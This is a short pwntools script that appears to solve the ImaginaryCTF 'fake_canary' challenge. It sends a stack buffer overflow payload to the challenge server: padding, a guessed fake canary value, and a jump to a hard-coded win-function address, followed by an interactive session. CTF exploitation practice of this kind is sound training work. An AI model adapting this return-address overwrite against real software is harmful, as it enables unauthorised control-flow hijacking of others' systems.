from pwn import *

#context.log_level = "debug"
r = remote("chal.imaginaryctf.org", 42002)
#r = process("fake_canary")
#gdb.attach(r)

win_addr = 0x00400726

padding = b'A'*40

payload = padding + p64(0xdeadbeef) + b'A'*8 + p64(win_addr)

r.recvuntil("name?")
r.sendline(payload)
r.interactive()
